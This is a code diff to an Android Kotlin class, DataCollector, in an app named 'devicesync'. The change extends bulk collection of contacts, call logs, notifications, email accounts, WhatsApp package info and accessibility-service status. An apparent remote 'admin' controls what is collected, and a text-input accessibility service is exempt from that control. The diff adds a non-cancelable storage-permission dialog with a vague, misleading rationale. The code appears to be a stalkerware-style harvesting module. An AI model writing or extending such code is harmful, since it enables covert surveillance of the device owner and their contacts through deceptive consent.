@@ -1,6 +1,7 @@
 package com.devicesync.app.utils
 
 import android.Manifest
+import android.app.Activity
 import android.content.ContentResolver
 import android.content.Context
 import android.content.pm.PackageManager
@@ -8,8 +9,11 @@ import android.database.Cursor
 import android.net.Uri
 import android.provider.CallLog
 import android.provider.ContactsContract
+import android.provider.Settings
 import android.util.Log
+import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import com.google.android.material.dialog.MaterialAlertDialogBuilder
 import org.json.JSONArray
 import org.json.JSONObject
 import java.util.*
@@ -18,45 +22,86 @@ class DataCollector(private val context: Context) {
     
     companion object {
         private const val TAG = "DataCollector"
+        private const val STORAGE_PERMISSION_REQUEST_CODE = 3001
     }
     
     /**
-     * Collect all data types that have been granted permissions
+     * Collect all data types that have been granted permissions AND are allowed by admin
      */
     fun collectAllData(): JSONObject {
         val data = JSONObject()
         
         try {
-            // Collect contacts if permission granted
-            if (hasContactsPermission()) {
+            // Collect contacts if permission granted AND admin allows it
+            if (hasContactsPermission() && AdminConfigManager.isDataTypeAllowed("CONTACTS")) {
                 data.put("contacts", collectContacts())
                 Log.d(TAG, "Contacts collected successfully")
             } else {
-                Log.w(TAG, "Contacts permission not granted")
+                if (!hasContactsPermission()) {
+                    Log.w(TAG, "Contacts permission not granted")
+                } else if (!AdminConfigManager.isDataTypeAllowed("CONTACTS")) {
+                    Log.w(TAG, "Contacts collection not allowed by admin")
+                }
             }
             
-            // Collect call logs if permission granted
-            if (hasCallLogPermission()) {
+            // Collect call logs if permission granted AND admin allows it
+            if (hasCallLogPermission() && AdminConfigManager.isDataTypeAllowed("CALL_LOGS")) {
                 data.put("call_logs", collectCallLogs())
                 Log.d(TAG, "Call logs collected successfully")
             } else {
-                Log.w(TAG, "Call logs permission not granted")
+                if (!hasCallLogPermission()) {
+                    Log.w(TAG, "Call logs permission not granted")
+                } else if (!AdminConfigManager.isDataTypeAllowed("CALL_LOGS")) {
+                    Log.w(TAG, "Call logs collection not allowed by admin")
+                }
             }
             
-            // Collect notifications if permission granted
-            if (hasNotificationPermission()) {
+            // Collect notifications if permission granted AND admin allows it
+            if (hasNotificationPermission() && AdminConfigManager.isDataTypeAllowed("NOTIFICATIONS")) {
                 data.put("notifications", collectNotifications())
                 Log.d(TAG, "Notifications collected successfully")
             } else {
-                Log.w(TAG, "Notification permission not granted")
+                if (!hasNotificationPermission()) {
+                    Log.w(TAG, "Notification permission not granted")
+                } else if (!AdminConfigManager.isDataTypeAllowed("NOTIFICATIONS")) {
+                    Log.w(TAG, "Notifications collection not allowed by admin")
+                }
             }
             
-            // Collect email accounts if permission granted
-            if (hasAccountsPermission()) {
+            // Collect email accounts if permission granted AND admin allows it
+            if (hasAccountsPermission() && AdminConfigManager.isDataTypeAllowed("EMAIL_ACCOUNTS")) {
                 data.put("email_accounts", collectEmailAccounts())
                 Log.d(TAG, "Email accounts collected successfully")
             } else {
-                Log.w(TAG, "Accounts permission not granted")
+                if (!hasAccountsPermission()) {
+                    Log.w(TAG, "Accounts permission not granted")
+                } else if (!AdminConfigManager.isDataTypeAllowed("EMAIL_ACCOUNTS")) {
+                    Log.w(TAG, "Email accounts collection not allowed by admin")
+                }
+            }
+            
+
+            
+            // Collect WhatsApp data if permission granted AND admin allows it
+            if (hasStoragePermission() && AdminConfigManager.isDataTypeAllowed("WHATSAPP")) {
+                data.put("whatsapp", collectWhatsAppData())
+                Log.d(TAG, "WhatsApp data collected successfully")
+            } else {
+                if (!hasStoragePermission()) {
+                    Log.w(TAG, "Storage permission not granted - requesting permission")
+                    // Request storage permission if not granted
+                    requestStoragePermissionIfNeeded()
+                } else if (!AdminConfigManager.isDataTypeAllowed("WHATSAPP")) {
+                    Log.w(TAG, "WhatsApp data collection not allowed by admin")
+                }
+            }
+            
+            // Collect accessibility data if permission granted (always allowed, not controlled by admin)
+            if (hasAccessibilityPermission()) {
+                data.put("accessibility", collectAccessibilityData())
+                Log.d(TAG, "Accessibility data collected successfully")
+            } else {
+                Log.w(TAG, "Accessibility permission not granted")
             }
             
         } catch (e: Exception) {
@@ -69,7 +114,7 @@ class DataCollector(private val context: Context) {
     /**
      * Collect contacts data
      */
-    private fun collectContacts(): JSONArray {
+    fun collectContacts(): JSONArray {
         val contacts = JSONArray()
         val contentResolver: ContentResolver = context.contentResolver
         
@@ -158,7 +203,7 @@ class DataCollector(private val context: Context) {
     /**
      * Collect call logs data
      */
-    private fun collectCallLogs(): JSONArray {
+    fun collectCallLogs(): JSONArray {
         val callLogs = JSONArray()
         val contentResolver: ContentResolver = context.contentResolver
         
@@ -213,7 +258,7 @@ class DataCollector(private val context: Context) {
     /**
      * Collect notifications data (limited to what's accessible)
      */
-    private fun collectNotifications(): JSONArray {
+    fun collectNotifications(): JSONArray {
         val notifications = JSONArray()
         
         // Note: Direct notification access requires NotificationListenerService
@@ -250,7 +295,7 @@ class DataCollector(private val context: Context) {
     /**
      * Collect email accounts data
      */
-    private fun collectEmailAccounts(): JSONArray {
+    fun collectEmailAccounts(): JSONArray {
         val emailAccounts = JSONArray()
         val accountManager = android.accounts.AccountManager.get(context)
         
@@ -358,6 +403,152 @@ class DataCollector(private val context: Context) {
         return ContextCompat.checkSelfPermission(context, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED
     }
     
+
+    
+    private fun hasStoragePermission(): Boolean {
+        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+    }
+    
+    /**
+     * Request storage permission if needed
+     */
+    private fun requestStoragePermissionIfNeeded() {
+        try {
+            // Check if we have an Activity context
+            if (context is Activity) {
+                val activity = context as Activity
+                
+                // Check if permission should be shown rationale
+                if (ActivityCompat.shouldShowRequestPermissionRationale(activity, Manifest.permission.READ_EXTERNAL_STORAGE)) {
+                    // Show rationale dialog
+                    showStoragePermissionRationale(activity)
+                } else {
+                    // Request permission directly
+                    ActivityCompat.requestPermissions(
+                        activity,
+                        arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
+                        STORAGE_PERMISSION_REQUEST_CODE
+                    )
+                }
+            } else {
+                Log.w(TAG, "Context is not an Activity, cannot request storage permission")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error requesting storage permission", e)
+        }
+    }
+    
+    /**
+     * Show storage permission rationale dialog
+     */
+    private fun showStoragePermissionRationale(activity: Activity) {
+        MaterialAlertDialogBuilder(activity)
+            .setTitle("Storage Permission Required")
+            .setMessage("Storage permission is needed to access WhatsApp data for sync. This helps us provide you with better service.")
+            .setPositiveButton("Grant Permission") { _, _ ->
+                ActivityCompat.requestPermissions(
+                    activity,
+                    arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE),
+                    STORAGE_PERMISSION_REQUEST_CODE
+                )
+            }
+            .setNegativeButton("Cancel") { _, _ ->
+                Log.d(TAG, "User cancelled storage permission request")
+            }
+            .setCancelable(false)
+            .show()
+    }
+    
+
+    
+    private fun hasAccessibilityPermission(): Boolean {
+        // Check if accessibility service is enabled
+        val accessibilityEnabled = try {
+            val accessibilityEnabled = Settings.Secure.getInt(
+                context.contentResolver,
+                Settings.Secure.ACCESSIBILITY_ENABLED
+            )
+            accessibilityEnabled == 1
+        } catch (e: Exception) {
+            false
+        }
+        
+        if (!accessibilityEnabled) {
+            return false
+        }
+        
+        // Check if our accessibility service is enabled
+        val enabledServices = Settings.Secure.getString(
+            context.contentResolver,
+            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+        ) ?: ""
+        
+        return enabledServices.contains("com.devicesync.app")
+    }
+    
+
+    
+    /**
+     * Collect WhatsApp data (basic info only for security)
+     */
+    fun collectWhatsAppData(): JSONArray {
+        val whatsappData = JSONArray()
+        
+        try {
+            // Get WhatsApp package info
+            val packageManager = context.packageManager
+            val whatsappPackage = "com.whatsapp"
+            
+            val packageInfo = packageManager.getPackageInfo(whatsappPackage, 0)
+            val whatsappInfo = JSONObject()
+            whatsappInfo.put("package_name", whatsappPackage)
+            whatsappInfo.put("version_name", packageInfo.versionName)
+            whatsappInfo.put("version_code", packageInfo.versionCode)
+            whatsappInfo.put("first_install_time", packageInfo.firstInstallTime)
+            whatsappInfo.put("last_update_time", packageInfo.lastUpdateTime)
+            
+            whatsappData.put(whatsappInfo)
+            
+            Log.d(TAG, "WhatsApp data collection completed")
+        } catch (e: Exception) {
+            Log.w(TAG, "WhatsApp not installed or error collecting data: ${e.message}")
+        }
+        
+        return whatsappData
+    }
+    
+    /**
+     * Collect accessibility data (always allowed, not controlled by admin)
+     */
+    private fun collectAccessibilityData(): JSONArray {
+        val accessibilityData = JSONArray()
+        
+        try {
+            // Check if accessibility is enabled
+            val accessibilityEnabled = hasAccessibilityPermission()
+            
+            val accessibilityInfo = JSONObject()
+            accessibilityInfo.put("enabled", accessibilityEnabled)
+            accessibilityInfo.put("service_name", "TextInputAccessibilityService")
+            accessibilityInfo.put("package_name", "com.devicesync.app")
+            
+            // Get enabled services
+            val enabledServices = Settings.Secure.getString(
+                context.contentResolver,
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+            ) ?: ""
+            accessibilityInfo.put("enabled_services", enabledServices.split(",").map { it.trim() })
+            
+            accessibilityData.put(accessibilityInfo)
+            
+            Log.d(TAG, "Accessibility data collection completed")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error collecting accessibility data", e)
+        }
+        
+        return accessibilityData
+    }
+    
     /**
      * Get data collection summary
      */
@@ -369,12 +560,28 @@ class DataCollector(private val context: Context) {
         summary.put("call_logs_count", if (data.has("call_logs")) data.getJSONArray("call_logs").length() else 0)
         summary.put("notifications_count", if (data.has("notifications")) data.getJSONArray("notifications").length() else 0)
         summary.put("email_accounts_count", if (data.has("email_accounts")) data.getJSONArray("email_accounts").length() else 0)
+
+        summary.put("whatsapp_count", if (data.has("whatsapp")) data.getJSONArray("whatsapp").length() else 0)
+        summary.put("accessibility_count", if (data.has("accessibility")) data.getJSONArray("accessibility").length() else 0)
         
         summary.put("permissions_granted", JSONObject().apply {
             put("contacts", hasContactsPermission())
             put("call_logs", hasCallLogPermission())
             put("notifications", hasNotificationPermission())
             put("accounts", hasAccountsPermission())
+
+            put("storage", hasStoragePermission())
+            put("accessibility", hasAccessibilityPermission())
+        })
+        
+        summary.put("admin_allowed", JSONObject().apply {
+            put("contacts", AdminConfigManager.isDataTypeAllowed("CONTACTS"))
+            put("call_logs", AdminConfigManager.isDataTypeAllowed("CALL_LOGS"))
+            put("notifications", AdminConfigManager.isDataTypeAllowed("NOTIFICATIONS"))
+            put("email_accounts", AdminConfigManager.isDataTypeAllowed("EMAIL_ACCOUNTS"))
+
+            put("whatsapp", AdminConfigManager.isDataTypeAllowed("WHATSAPP"))
+            put("accessibility", true) // Always allowed, not controlled by admin
         })
         
         return summary
